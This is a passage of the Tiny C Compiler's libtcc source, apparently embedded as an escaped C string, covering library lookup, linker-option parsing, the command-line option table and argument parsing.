    static const char *const libs[] = {\"%s/lib%s.so.*\", \"%s/lib%s.a\", NULL};\n\
    const char *const *pp = s->static_link ? libs + 1 : libs;\n\
#else\n\
    static const char *const libs[] = {\"%s/lib%s.so\", \"%s/lib%s.a\", NULL};\n\
    const char *const *pp = s->static_link ? libs + 1 : libs;\n\
#endif\n\
    int flags = s->filetype & AFF_WHOLE_ARCHIVE;\n\
    while (*pp)\n\
    {\n\
        if (0 == tcc_add_library_internal(s, *pp,\n\
                                          libraryname, flags, s->library_paths, s->nb_library_paths))\n\
            return 0;\n\
        ++pp;\n\
    }\n\
    return -1;\n\
}\n\
\n\
PUB_FUNC int tcc_add_library_err(TCCState *s1, const char *libname)\n\
{\n\
    int ret = tcc_add_library(s1, libname);\n\
    if (ret < 0)\n\
        tcc_error_noabort(\"library \'%s\' not found\", libname);\n\
    return ret;\n\
}\n\
\n\
/* handle #pragma comment(lib,) */\n\
ST_FUNC void tcc_add_pragma_libs(TCCState *s1)\n\
{\n\
    int i;\n\
    for (i = 0; i < s1->nb_pragma_libs; i++)\n\
        tcc_add_library_err(s1, s1->pragma_libs[i]);\n\
}\n\
\n\
LIBTCCAPI int tcc_add_symbol(TCCState *s1, const char *name, const void *val)\n\
{\n\
#ifdef TCC_TARGET_PE\n\
    /* On x86_64 \'val\' might not be reachable with a 32bit offset.\n\
       So it is handled here as if it were in a DLL. */\n\
    pe_putimport(s1, 0, name, (uintptr_t)val);\n\
#else\n\
    char buf[256];\n\
    if (s1->leading_underscore)\n\
    {\n\
        buf[0] = \'_\';\n\
        pstrcpy(buf + 1, sizeof(buf) - 1, name);\n\
        name = buf;\n\
    }\n\
    set_global_sym(s1, name, NULL, (addr_t)(uintptr_t)val); /* NULL: SHN_ABS */\n\
#endif\n\
    return 0;\n\
}\n\
\n\
LIBTCCAPI void tcc_set_lib_path(TCCState *s, const char *path)\n\
{\n\
    tcc_free(s->tcc_lib_path);\n\
    s->tcc_lib_path = tcc_strdup(path);\n\
}\n\
\n\
/********************************************************/\n\
/* options parser */\n\
\n\
static int strstart(const char *val, const char **str)\n\
{\n\
    const char *p, *q;\n\
    p = *str;\n\
    q = val;\n\
    while (*q)\n\
    {\n\
        if (*p != *q)\n\
            return 0;\n\
        p++;\n\
        q++;\n\
    }\n\
    *str = p;\n\
    return 1;\n\
}\n\
\n\
/* Like strstart, but automatically takes into account that ld options can\n\
 *\n\
 * - start with double or single dash (e.g. \'--soname\' or \'-soname\')\n\
 * - arguments can be given as separate or after \'=\' (e.g. \'-Wl,-soname,x.so\'\n\
 *   or \'-Wl,-soname=x.so\')\n\
 *\n\
 * you provide `val` always in \'option[=]\' form (no leading -)\n\
 */\n\
static int link_option(const char *str, const char *val, const char **ptr)\n\
{\n\
    const char *p, *q;\n\
    int ret;\n\
\n\
    /* there should be 1 or 2 dashes */\n\
    if (*str++ != \'-\')\n\
        return 0;\n\
    if (*str == \'-\')\n\
        str++;\n\
\n\
    /* then str & val should match (potentially up to \'=\') */\n\
    p = str;\n\
    q = val;\n\
\n\
    ret = 1;\n\
    if (q[0] == \'?\')\n\
    {\n\
        ++q;\n\
        if (strstart(\"no-\", &p))\n\
            ret = -1;\n\
    }\n\
\n\
    while (*q != \'\0\' && *q != \'=\')\n\
    {\n\
        if (*p != *q)\n\
            return 0;\n\
        p++;\n\
        q++;\n\
    }\n\
\n\
    /* \'=\' near eos means \',\' or \'=\' is ok */\n\
    if (*q == \'=\')\n\
    {\n\
        if (*p == 0)\n\
            *ptr = p;\n\
        if (*p != \',\' && *p != \'=\')\n\
            return 0;\n\
        p++;\n\
    }\n\
    else if (*p)\n\
    {\n\
        return 0;\n\
    }\n\
    *ptr = p;\n\
    return ret;\n\
}\n\
\n\
static const char *skip_linker_arg(const char **str)\n\
{\n\
    const char *s1 = *str;\n\
    const char *s2 = strchr(s1, \',\');\n\
    *str = s2 ? s2++ : (s2 = s1 + strlen(s1));\n\
    return s2;\n\
}\n\
\n\
static void copy_linker_arg(char **pp, const char *s, int sep)\n\
{\n\
    const char *q = s;\n\
    char *p = *pp;\n\
    int l = 0;\n\
    if (p && sep)\n\
        p[l = strlen(p)] = sep, ++l;\n\
    skip_linker_arg(&q);\n\
    pstrncpy(l + (*pp = tcc_realloc(p, q - s + l + 1)), s, q - s);\n\
}\n\
\n\
static void args_parser_add_file(TCCState *s, const char *filename, int filetype)\n\
{\n\
    struct filespec *f = tcc_malloc(sizeof *f + strlen(filename));\n\
    f->type = filetype;\n\
    strcpy(f->name, filename);\n\
    dynarray_add(&s->files, &s->nb_files, f);\n\
}\n\
\n\
/* set linker options */\n\
static int tcc_set_linker(TCCState *s, const char *option)\n\
{\n\
    TCCState *s1 = s;\n\
    while (*option)\n\
    {\n\
\n\
        const char *p = NULL;\n\
        char *end = NULL;\n\
        int ignoring = 0;\n\
        int ret;\n\
\n\
        if (link_option(option, \"Bsymbolic\", &p))\n\
        {\n\
            s->symbolic = 1;\n\
        }\n\
        else if (link_option(option, \"nostdlib\", &p))\n\
        {\n\
            s->nostdlib = 1;\n\
        }\n\
        else if (link_option(option, \"e=\", &p) || link_option(option, \"entry=\", &p))\n\
        {\n\
            copy_linker_arg(&s->elf_entryname, p, 0);\n\
        }\n\
        else if (link_option(option, \"fini=\", &p))\n\
        {\n\
            copy_linker_arg(&s->fini_symbol, p, 0);\n\
            ignoring = 1;\n\
        }\n\
        else if (link_option(option, \"image-base=\", &p) || link_option(option, \"Ttext=\", &p))\n\
        {\n\
            s->text_addr = strtoull(p, &end, 16);\n\
            s->has_text_addr = 1;\n\
        }\n\
        else if (link_option(option, \"init=\", &p))\n\
        {\n\
            copy_linker_arg(&s->init_symbol, p, 0);\n\
            ignoring = 1;\n\
        }\n\
        else if (link_option(option, \"Map=\", &p))\n\
        {\n\
            copy_linker_arg(&s->mapfile, p, 0);\n\
            ignoring = 1;\n\
        }\n\
        else if (link_option(option, \"oformat=\", &p))\n\
        {\n\
#if defined(TCC_TARGET_PE)\n\
            if (strstart(\"pe-\", &p))\n\
            {\n\
#elif PTR_SIZE == 8\n\
            if (strstart(\"elf64-\", &p))\n\
            {\n\
#else\n\
            if (strstart(\"elf32-\", &p))\n\
            {\n\
#endif\n\
                s->output_format = TCC_OUTPUT_FORMAT_ELF;\n\
            }\n\
            else if (!strcmp(p, \"binary\"))\n\
            {\n\
                s->output_format = TCC_OUTPUT_FORMAT_BINARY;\n\
#ifdef TCC_TARGET_COFF\n\
            }\n\
            else if (!strcmp(p, \"coff\"))\n\
            {\n\
                s->output_format = TCC_OUTPUT_FORMAT_COFF;\n\
#endif\n\
            }\n\
            else\n\
                goto err;\n\
        }\n\
        else if (link_option(option, \"as-needed\", &p))\n\
        {\n\
            ignoring = 1;\n\
        }\n\
        else if (link_option(option, \"O\", &p))\n\
        {\n\
            ignoring = 1;\n\
        }\n\
        else if (link_option(option, \"export-all-symbols\", &p))\n\
        {\n\
            s->rdynamic = 1;\n\
        }\n\
        else if (link_option(option, \"export-dynamic\", &p))\n\
        {\n\
            s->rdynamic = 1;\n\
        }\n\
        else if (link_option(option, \"rpath=\", &p))\n\
        {\n\
            copy_linker_arg(&s->rpath, p, \':\');\n\
        }\n\
        else if (link_option(option, \"enable-new-dtags\", &p))\n\
        {\n\
            s->enable_new_dtags = 1;\n\
        }\n\
        else if (link_option(option, \"section-alignment=\", &p))\n\
        {\n\
            s->section_align = strtoul(p, &end, 16);\n\
        }\n\
        else if (link_option(option, \"soname=\", &p))\n\
        {\n\
            copy_linker_arg(&s->soname, p, 0);\n\
        }\n\
        else if (link_option(option, \"install_name=\", &p))\n\
        {\n\
            copy_linker_arg(&s->soname, p, 0);\n\
#ifdef TCC_TARGET_PE\n\
        }\n\
        else if (link_option(option, \"large-address-aware\", &p))\n\
        {\n\
            s->pe_characteristics |= 0x20;\n\
        }\n\
        else if (link_option(option, \"file-alignment=\", &p))\n\
        {\n\
            s->pe_file_align = strtoul(p, &end, 16);\n\
        }\n\
        else if (link_option(option, \"stack=\", &p))\n\
        {\n\
            s->pe_stack_size = strtoul(p, &end, 10);\n\
        }\n\
        else if (link_option(option, \"subsystem=\", &p))\n\
        {\n\
#if defined(TCC_TARGET_I386) || defined(TCC_TARGET_X86_64)\n\
            if (!strcmp(p, \"native\"))\n\
            {\n\
                s->pe_subsystem = 1;\n\
            }\n\
            else if (!strcmp(p, \"console\"))\n\
            {\n\
                s->pe_subsystem = 3;\n\
            }\n\
            else if (!strcmp(p, \"gui\") || !strcmp(p, \"windows\"))\n\
            {\n\
                s->pe_subsystem = 2;\n\
            }\n\
            else if (!strcmp(p, \"posix\"))\n\
            {\n\
                s->pe_subsystem = 7;\n\
            }\n\
            else if (!strcmp(p, \"efiapp\"))\n\
            {\n\
                s->pe_subsystem = 10;\n\
            }\n\
            else if (!strcmp(p, \"efiboot\"))\n\
            {\n\
                s->pe_subsystem = 11;\n\
            }\n\
            else if (!strcmp(p, \"efiruntime\"))\n\
            {\n\
                s->pe_subsystem = 12;\n\
            }\n\
            else if (!strcmp(p, \"efirom\"))\n\
            {\n\
                s->pe_subsystem = 13;\n\
#elif defined(TCC_TARGET_ARM)\n\
            if (!strcmp(p, \"wince\"))\n\
            {\n\
                s->pe_subsystem = 9;\n\
#endif\n\
            }\n\
            else\n\
                goto err;\n\
#endif\n\
#ifdef TCC_TARGET_MACHO\n\
        }\n\
        else if (link_option(option, \"all_load\", &p))\n\
        {\n\
            s->filetype |= AFF_WHOLE_ARCHIVE;\n\
        }\n\
        else if (link_option(option, \"force_load\", &p))\n\
        {\n\
            s->filetype |= AFF_WHOLE_ARCHIVE;\n\
            args_parser_add_file(s, p, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));\n\
            s->nb_libraries++;\n\
        }\n\
        else if (link_option(option, \"single_module\", &p))\n\
        {\n\
            ignoring = 1;\n\
#endif\n\
        }\n\
        else if (ret = link_option(option, \"?whole-archive\", &p), ret)\n\
        {\n\
            if (ret > 0)\n\
                s->filetype |= AFF_WHOLE_ARCHIVE;\n\
            else\n\
                s->filetype &= ~AFF_WHOLE_ARCHIVE;\n\
        }\n\
        else if (link_option(option, \"z=\", &p))\n\
        {\n\
            ignoring = 1;\n\
        }\n\
        else if (p)\n\
        {\n\
            return 0;\n\
        }\n\
        else\n\
        {\n\
        err:\n\
            tcc_error(\"unsupported linker option \'%s\'\", option);\n\
        }\n\
        if (ignoring)\n\
            tcc_warning_c(warn_unsupported)(\"unsupported linker option \'%s\'\", option);\n\
        option = skip_linker_arg(&p);\n\
    }\n\
    return 1;\n\
}\n\
\n\
typedef struct TCCOption\n\
{\n\
    const char *name;\n\
    uint16_t index;\n\
    uint16_t flags;\n\
} TCCOption;\n\
\n\
enum\n\
{\n\
    TCC_OPTION_ignored = 0,\n\
    TCC_OPTION_HELP,\n\
    TCC_OPTION_HELP2,\n\
    TCC_OPTION_v,\n\
    TCC_OPTION_I,\n\
    TCC_OPTION_D,\n\
    TCC_OPTION_U,\n\
    TCC_OPTION_P,\n\
    TCC_OPTION_L,\n\
    TCC_OPTION_B,\n\
    TCC_OPTION_l,\n\
    TCC_OPTION_bench,\n\
    TCC_OPTION_bt,\n\
    TCC_OPTION_b,\n\
    TCC_OPTION_ba,\n\
    TCC_OPTION_g,\n\
    TCC_OPTION_c,\n\
    TCC_OPTION_dumpversion,\n\
    TCC_OPTION_d,\n\
    TCC_OPTION_static,\n\
    TCC_OPTION_std,\n\
    TCC_OPTION_shared,\n\
    TCC_OPTION_soname,\n\
    TCC_OPTION_o,\n\
    TCC_OPTION_r,\n\
    TCC_OPTION_Wl,\n\
    TCC_OPTION_Wp,\n\
    TCC_OPTION_W,\n\
    TCC_OPTION_O,\n\
    TCC_OPTION_mfloat_abi,\n\
    TCC_OPTION_m,\n\
    TCC_OPTION_f,\n\
    TCC_OPTION_isystem,\n\
    TCC_OPTION_iwithprefix,\n\
    TCC_OPTION_include,\n\
    TCC_OPTION_nostdinc,\n\
    TCC_OPTION_nostdlib,\n\
    TCC_OPTION_print_search_dirs,\n\
    TCC_OPTION_rdynamic,\n\
    TCC_OPTION_pthread,\n\
    TCC_OPTION_run,\n\
    TCC_OPTION_w,\n\
    TCC_OPTION_E,\n\
    TCC_OPTION_M,\n\
    TCC_OPTION_MD,\n\
    TCC_OPTION_MF,\n\
    TCC_OPTION_MM,\n\
    TCC_OPTION_MMD,\n\
    TCC_OPTION_x,\n\
    TCC_OPTION_ar,\n\
    TCC_OPTION_impdef,\n\
    TCC_OPTION_dynamiclib,\n\
    TCC_OPTION_flat_namespace,\n\
    TCC_OPTION_two_levelnamespace,\n\
    TCC_OPTION_undefined,\n\
    TCC_OPTION_install_name,\n\
    TCC_OPTION_compatibility_version,\n\
    TCC_OPTION_current_version,\n\
};\n\
\n\
#define TCC_OPTION_HAS_ARG 0x0001\n\
#define TCC_OPTION_NOSEP 0x0002 /* cannot have space before option and arg */\n\
\n\
static const TCCOption tcc_options[] = {\n\
    {\"h\", TCC_OPTION_HELP, 0},\n\
    {\"-help\", TCC_OPTION_HELP, 0},\n\
    {\"?\", TCC_OPTION_HELP, 0},\n\
    {\"hh\", TCC_OPTION_HELP2, 0},\n\
    {\"v\", TCC_OPTION_v, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"-version\", TCC_OPTION_v, 0}, /* handle as verbose, also prints version*/\n\
    {\"I\", TCC_OPTION_I, TCC_OPTION_HAS_ARG},\n\
    {\"D\", TCC_OPTION_D, TCC_OPTION_HAS_ARG},\n\
    {\"U\", TCC_OPTION_U, TCC_OPTION_HAS_ARG},\n\
    {\"P\", TCC_OPTION_P, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"L\", TCC_OPTION_L, TCC_OPTION_HAS_ARG},\n\
    {\"B\", TCC_OPTION_B, TCC_OPTION_HAS_ARG},\n\
    {\"l\", TCC_OPTION_l, TCC_OPTION_HAS_ARG},\n\
    {\"bench\", TCC_OPTION_bench, 0},\n\
#ifdef CONFIG_TCC_BACKTRACE\n\
    {\"bt\", TCC_OPTION_bt, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
#endif\n\
#ifdef CONFIG_TCC_BCHECK\n\
    {\"b\", TCC_OPTION_b, 0},\n\
#endif\n\
    {\"g\", TCC_OPTION_g, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
#ifdef TCC_TARGET_MACHO\n\
    {\"compatibility_version\", TCC_OPTION_compatibility_version, TCC_OPTION_HAS_ARG},\n\
    {\"current_version\", TCC_OPTION_current_version, TCC_OPTION_HAS_ARG},\n\
#endif\n\
    {\"c\", TCC_OPTION_c, 0},\n\
#ifdef TCC_TARGET_MACHO\n\
    {\"dynamiclib\", TCC_OPTION_dynamiclib, 0},\n\
#endif\n\
    {\"dumpversion\", TCC_OPTION_dumpversion, 0},\n\
    {\"d\", TCC_OPTION_d, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"static\", TCC_OPTION_static, 0},\n\
    {\"std\", TCC_OPTION_std, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"shared\", TCC_OPTION_shared, 0},\n\
    {\"soname\", TCC_OPTION_soname, TCC_OPTION_HAS_ARG},\n\
    {\"o\", TCC_OPTION_o, TCC_OPTION_HAS_ARG},\n\
    {\"pthread\", TCC_OPTION_pthread, 0},\n\
    {\"run\", TCC_OPTION_run, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"rdynamic\", TCC_OPTION_rdynamic, 0},\n\
    {\"r\", TCC_OPTION_r, 0},\n\
    {\"Wl,\", TCC_OPTION_Wl, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"Wp,\", TCC_OPTION_Wp, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"W\", TCC_OPTION_W, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"O\", TCC_OPTION_O, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
#ifdef TCC_TARGET_ARM\n\
    {\"mfloat-abi\", TCC_OPTION_mfloat_abi, TCC_OPTION_HAS_ARG},\n\
#endif\n\
    {\"m\", TCC_OPTION_m, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
#ifdef TCC_TARGET_MACHO\n\
    {\"flat_namespace\", TCC_OPTION_flat_namespace, 0},\n\
#endif\n\
    {\"f\", TCC_OPTION_f, TCC_OPTION_HAS_ARG | TCC_OPTION_NOSEP},\n\
    {\"isystem\", TCC_OPTION_isystem, TCC_OPTION_HAS_ARG},\n\
    {\"include\", TCC_OPTION_include, TCC_OPTION_HAS_ARG},\n\
    {\"nostdinc\", TCC_OPTION_nostdinc, 0},\n\
    {\"nostdlib\", TCC_OPTION_nostdlib, 0},\n\
    {\"print-search-dirs\", TCC_OPTION_print_search_dirs, 0},\n\
    {\"w\", TCC_OPTION_w, 0},\n\
    {\"E\", TCC_OPTION_E, 0},\n\
    {\"M\", TCC_OPTION_M, 0},\n\
    {\"MD\", TCC_OPTION_MD, 0},\n\
    {\"MF\", TCC_OPTION_MF, TCC_OPTION_HAS_ARG},\n\
    {\"MM\", TCC_OPTION_MM, 0},\n\
    {\"MMD\", TCC_OPTION_MMD, 0},\n\
    {\"x\", TCC_OPTION_x, TCC_OPTION_HAS_ARG},\n\
    {\"ar\", TCC_OPTION_ar, 0},\n\
#ifdef TCC_TARGET_PE\n\
    {\"impdef\", TCC_OPTION_impdef, 0},\n\
#endif\n\
#ifdef TCC_TARGET_MACHO\n\
    {\"install_name\", TCC_OPTION_install_name, TCC_OPTION_HAS_ARG},\n\
    {\"two_levelnamespace\", TCC_OPTION_two_levelnamespace, 0},\n\
    {\"undefined\", TCC_OPTION_undefined, TCC_OPTION_HAS_ARG},\n\
#endif\n\
    /* ignored (silently, except after -Wunsupported) */\n\
    {\"arch\", 0, TCC_OPTION_HAS_ARG},\n\
    {\"C\", 0, 0},\n\
    {\"-param\", 0, TCC_OPTION_HAS_ARG},\n\
    {\"pedantic\", 0, 0},\n\
    {\"pipe\", 0, 0},\n\
    {\"s\", 0, 0},\n\
    {\"traditional\", 0, 0},\n\
    {NULL, 0, 0},\n\
};\n\
\n\
typedef struct FlagDef\n\
{\n\
    uint16_t offset;\n\
    uint16_t flags;\n\
    const char *name;\n\
} FlagDef;\n\
\n\
#define WD_ALL 0x0001    /* warning is activated when using -Wall */\n\
#define FD_INVERT 0x0002 /* invert value before storing */\n\
\n\
static const FlagDef options_W[] = {\n\
    {offsetof(TCCState, warn_all), WD_ALL, \"all\"},\n\
    {offsetof(TCCState, warn_error), 0, \"error\"},\n\
    {offsetof(TCCState, warn_write_strings), 0, \"write-strings\"},\n\
    {offsetof(TCCState, warn_unsupported), 0, \"unsupported\"},\n\
    {offsetof(TCCState, warn_implicit_function_declaration), WD_ALL, \"implicit-function-declaration\"},\n\
    {offsetof(TCCState, warn_discarded_qualifiers), WD_ALL, \"discarded-qualifiers\"},\n\
    {0, 0, NULL}};\n\
\n\
static const FlagDef options_f[] = {\n\
    {offsetof(TCCState, char_is_unsigned), 0, \"unsigned-char\"},\n\
    {offsetof(TCCState, char_is_unsigned), FD_INVERT, \"signed-char\"},\n\
    {offsetof(TCCState, nocommon), FD_INVERT, \"common\"},\n\
    {offsetof(TCCState, leading_underscore), 0, \"leading-underscore\"},\n\
    {offsetof(TCCState, ms_extensions), 0, \"ms-extensions\"},\n\
    {offsetof(TCCState, dollars_in_identifiers), 0, \"dollars-in-identifiers\"},\n\
    {offsetof(TCCState, test_coverage), 0, \"test-coverage\"},\n\
    {0, 0, NULL}};\n\
\n\
static const FlagDef options_m[] = {\n\
    {offsetof(TCCState, ms_bitfields), 0, \"ms-bitfields\"},\n\
#ifdef TCC_TARGET_X86_64\n\
    {offsetof(TCCState, nosse), FD_INVERT, \"sse\"},\n\
#endif\n\
    {0, 0, NULL}};\n\
\n\
static int set_flag(TCCState *s, const FlagDef *flags, const char *name)\n\
{\n\
    int value, mask, ret;\n\
    const FlagDef *p;\n\
    const char *r;\n\
    unsigned char *f;\n\
\n\
    r = name, value = !strstart(\"no-\", &r), mask = 0;\n\
\n\
    /* when called with options_W, look for -W[no-]error=<option> */\n\
    if ((flags->flags & WD_ALL) && strstart(\"error=\", &r))\n\
        value = value ? WARN_ON | WARN_ERR : WARN_NOE, mask = WARN_ON;\n\
\n\
    for (ret = -1, p = flags; p->name; ++p)\n\
    {\n\
        if (ret)\n\
        {\n\
            if (strcmp(r, p->name))\n\
                continue;\n\
        }\n\
        else\n\
        {\n\
            if (0 == (p->flags & WD_ALL))\n\
                continue;\n\
        }\n\
\n\
        f = (unsigned char *)s + p->offset;\n\
        *f = (*f & mask) | (value ^ !!(p->flags & FD_INVERT));\n\
\n\
        if (ret)\n\
        {\n\
            ret = 0;\n\
            if (strcmp(r, \"all\"))\n\
                break;\n\
        }\n\
    }\n\
    return ret;\n\
}\n\
\n\
static int args_parser_make_argv(const char *r, int *argc, char ***argv)\n\
{\n\
    int ret = 0, q, c;\n\
    CString str;\n\
    for (;;)\n\
    {\n\
        while (c = (unsigned char)*r, c && c <= \' \')\n\
            ++r;\n\
        if (c == 0)\n\
            break;\n\
        q = 0;\n\
        cstr_new(&str);\n\
        while (c = (unsigned char)*r, c)\n\
        {\n\
            ++r;\n\
            if (c == \'\\\' && (*r == \'\"\' || *r == \'\\\'))\n\
            {\n\
                c = *r++;\n\
            }\n\
            else if (c == \'\"\')\n\
            {\n\
                q = !q;\n\
                continue;\n\
            }\n\
            else if (q == 0 && c <= \' \')\n\
            {\n\
                break;\n\
            }\n\
            cstr_ccat(&str, c);\n\
        }\n\
        cstr_ccat(&str, 0);\n\
        // printf(\"<%s>\n\", str.data), fflush(stdout);\n\
        dynarray_add(argv, argc, tcc_strdup(str.data));\n\
        cstr_free(&str);\n\
        ++ret;\n\
    }\n\
    return ret;\n\
}\n\
\n\
/* read list file */\n\
static void args_parser_listfile(TCCState *s,\n\
                                 const char *filename, int optind, int *pargc, char ***pargv)\n\
{\n\
    TCCState *s1 = s;\n\
    int fd, i;\n\
    char *p;\n\
    int argc = 0;\n\
    char **argv = NULL;\n\
\n\
    fd = open(filename, O_RDONLY | O_BINARY);\n\
    if (fd < 0)\n\
        tcc_error(\"listfile \'%s\' not found\", filename);\n\
\n\
    p = tcc_load_text(fd);\n\
    for (i = 0; i < *pargc; ++i)\n\
        if (i == optind)\n\
            args_parser_make_argv(p, &argc, &argv);\n\
        else\n\
            dynarray_add(&argv, &argc, tcc_strdup((*pargv)[i]));\n\
\n\
    tcc_free(p);\n\
    dynarray_reset(&s->argv, &s->argc);\n\
    *pargc = s->argc = argc, *pargv = s->argv = argv;\n\
}\n\
\n\
#if defined TCC_TARGET_MACHO\n\
static uint32_t parse_version(TCCState *s1, const char *version)\n\
{\n\
    uint32_t a = 0;\n\
    uint32_t b = 0;\n\
    uint32_t c = 0;\n\
    char *last;\n\
\n\
    a = strtoul(version, &last, 10);\n\
    if (*last == \'.\')\n\
    {\n\
        b = strtoul(&last[1], &last, 10);\n\
        if (*last == \'.\')\n\
            c = strtoul(&last[1], &last, 10);\n\
    }\n\
    if (*last || a > 0xffff || b > 0xff || c > 0xff)\n\
        tcc_error(\"version a.b.c not correct: %s\", version);\n\
    return (a << 16) | (b << 8) | c;\n\
}\n\
#endif\n\
\n\
PUB_FUNC int tcc_parse_args(TCCState *s, int *pargc, char ***pargv, int optind)\n\
{\n\
    TCCState *s1 = s;\n\
    const TCCOption *popt;\n\
    const char *optarg, *r;\n\
    const char *run = NULL;\n\
    int x;\n\
    CString linker_arg; /* collect -Wl options */\n\
    int tool = 0, arg_start = 0, noaction = optind;\n\
    char **argv = *pargv;\n\
    int argc = *pargc;\n\
\n\
    cstr_new(&linker_arg);\n\
\n\
    while (optind < argc)\n\
    {\n\
        r = argv[optind];\n\
        if (r[0] == \'@\' && r[1] != \'\0\')\n\
        {\n\
            args_parser_listfile(s, r + 1, optind, &argc, &argv);\n\
            continue;\n\
        }\n\
        optind++;\n\
        if (tool)\n\
        {\n\
            if (r[0] == \'-\' && r[1] == \'v\' && r[2] == 0)\n\
                ++s->verbose;\n\
            continue;\n\
        }\n\
    reparse:\n\
        if (r[0] != \'-\' || r[1] == \'\0\')\n\
        {\n\
            if (r[0] != \'@\') /* allow \"tcc file(s) -run @ args ...\" */\n\
                args_parser_add_file(s, r, s->filetype);\n\
            if (run)\n\
            {\n\
                tcc_set_options(s, run);\n\
                arg_start = optind - 1;\n\
                break;\n\
            }\n\
            continue;\n\
        }\n\
\n\
        /* find option in table */\n\
        for (popt = tcc_options;; ++popt)\n\
        {\n\
            const char *p1 = popt->name;\n\
            const char *r1 = r + 1;\n\
            if (p1 == NULL)\n\
                tcc_error(\"invalid option -- \'%s\'\", r);\n\
            if (!strstart(p1, &r1))\n\
                continue;\n\
            optarg = r1;\n\
            if (popt->flags & TCC_OPTION_HAS_ARG)\n\
            {\n\
                if (*r1 == \'\0\' && !(popt->flags & TCC_OPTION_NOSEP))\n\
                {\n\
                    if (optind >= argc)\n\
                    arg_err:\n\
                        tcc_error(\"argument to \'%s\' is missing\", r);\n\
                    optarg = argv[optind++];\n\
                }\n\
            }\n\
            else if (*r1 != \'\0\')\n\
                continue;\n\
            break;\n\
        }\n\
\n\
        switch (popt->index)\n\
        {\n\
        case TCC_OPTION_HELP:\n\
            x = OPT_HELP;\n\
            goto extra_action;\n\
        case TCC_OPTION_HELP2:\n\
            x = OPT_HELP2;\n\
            goto extra_action;\n\
        case TCC_OPTION_I:\n\
            tcc_add_include_path(s, optarg);\n\
            break;\n\
        case TCC_OPTION_D:\n\
            tcc_define_symbol(s, optarg, NULL);\n\
            break;\n\
        case TCC_OPTION_U:\n\
            tcc_undefine_symbol(s, optarg);\n\
            break;\n\
        case TCC_OPTION_L:\n\
            tcc_add_library_path(s, optarg);\n\
            break;\n\
        case TCC_OPTION_B:\n\
            /* set tcc utilities path (mainly for tcc development) */\n\
            tcc_set_lib_path(s, optarg);\n\
            ++noaction;\n\
            break;\n\
        case TCC_OPTION_l:\n\
            args_parser_add_file(s, optarg, AFF_TYPE_LIB | (s->filetype & ~AFF_TYPE_MASK));\n\
            s->nb_libraries++;\n\
            break;\n\
        case TCC_OPTION_pthread:\n\
            s->option_pthread = 1;\n\
            break;\n\
        case TCC_OPTION_bench:\n\
            s->do_bench = 1;\n\
            break;\n\
#ifdef CONFIG_TCC_BACKTRACE\n\
        case TCC_OPTION_bt:\n\
            s->rt_num_callers = atoi(optarg);\n\
            s->do_backtrace = 1;\n\
            s->do_debug = 1;\n\
            s->dwarf = DWARF_VERSION;\n\
            break;\n\
#endif\n\
#ifdef CONFIG_TCC_BCHECK\n\
        case TCC_OPTION_b:\n\
            s->do_bounds_check = 1;\n\
            s->do_backtrace = 1;\n\
            s->do_debug = 1;\n\
            s->dwarf = DWARF_VERSION;\n\
            break;\n\
#endif\n\
        case TCC_OPTION_g:\n\
            s->do_debug = 1;\n\
            s->dwarf = DWARF_VERSION;\n\
\n\
            if (strstart(\"dwarf\", &optarg))\n\
                s->dwarf = (*optarg) ? (0 - atoi(optarg)) : DEFAULT_DWARF_VERSION;\n\
            break;\n\
        case TCC_OPTION_c:\n\
            x = TCC_OUTPUT_OBJ;\n\
        set_output_type:\n\
            if (s->output_type)\n\
                tcc_warning(\"-%s: overriding compiler action already specified\", popt->name);\n\
            s->output_type = x;\n\
            break;\n\
        case TCC_OPTION_d:\n\
            if (*optarg == \'D\')\n\
                s->dflag = 3;\n\
            else if (*optarg == \'M\')\n\
                s->dflag = 7;\n\
            else if (*optarg == \'t\')\n\
                s->dflag = 16;\n\
            else if (isnum(*optarg))\n\
                s->g_debug |= atoi(optarg);\n\
            else\n\
                goto unsupported_option;\n\
            break;\n\
        case TCC_OPTION_static:\n\
            s->static_link = 1;\n\
            break;\n\
        case TCC_OPTION_std:\n\
            if (strcmp(optarg, \"=c11\") == 0)\n\
                s->cversion = 201112;\n\
            break;\n\
        case TCC_OPTION_shared:\n\
            x = TCC_OUTPUT_DLL;\n\
            goto set_output_type;\n\
        case TCC_OPTION_soname:\n\
            s->soname = tcc_strdup(optarg);\n\
            break;\n\
        case TCC_OPTION_o:\n\
            if (s->outfile)\n\
            {\n\
                tcc_warning(\"multiple -o option\");\n\
                tcc_free(s->outfile);\n\
            }\n\
            s->outfile = tcc_strdup(optarg);\n\
            break;\n\
        case TCC_OPTION_r:\n\
            /* generate a .o merging several output files */\n\
            s->option_r = 1;\n\
            x = TCC_OUTPUT_OBJ;\n\
            goto set_output_type;\n\
        case TCC_OPTION_isystem:\n\
            tcc_add_sysinclude_path(s, optarg);\n\
            break;\n\
        case TCC_OPTION_include:\n\
            cstr_printf(&s->cmdline_incl, \"#include \"%s\"\n\", optarg);\n\
            break;\n\
        case TCC_OPTION_nostdinc:\n\
            s->nostdinc = 1;\n\
            break;\n\
        case TCC_OPTION_nostdlib:\n\
            s->nostdlib = 1;\n\
            break;\n\
        case TCC_OPTION_run:\n\
#ifndef TCC_IS_NATIVE\n\
            tcc_error(\"-run is not available in a cross compiler\");\n\
#endif\n\
            run = optarg;\n\
            x = TCC_OUTPUT_MEMORY;\n\
            goto set_output_type;\n\
        case TCC_OPTION_v:\n\
            do\n\
                ++s->verbose;\n\
            while (*optarg++ == \'v\');\n\
            ++noaction;\n\
            break;\n\
        case TCC_OPTION_f:\n\
            if (set_flag(s, options_f, optarg) < 0)\n\
                goto unsupported_option;\n\
            break;\n\
#ifdef TCC_TARGET_ARM\n\
        case TCC_OPTION_mfloat_abi:\n\
            /* tcc doesn\'t support soft float yet */\n\
